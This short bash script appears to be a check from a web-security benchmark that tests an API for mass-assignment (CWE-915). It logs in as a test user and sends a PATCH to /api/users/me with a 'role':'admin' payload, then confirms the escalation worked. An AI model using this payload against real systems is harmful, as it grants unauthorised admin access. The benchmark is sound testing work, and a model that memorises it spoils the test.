#!/usr/bin/env bash
# MASSASSIGN-001 (CWE-915): PATCH /api/users/me sets a privileged column (role).
set -e; . "$(dirname "$0")/_lib.sh"
login user1@bench.local User123!
curl -s -b "$JAR" -X PATCH "$TARGET/api/users/me" -H 'content-type: application/json' \
  -d '{"role":"admin","isAdmin":true}' >/dev/null
[ "$(user_role user1@bench.local)" = "admin" ]
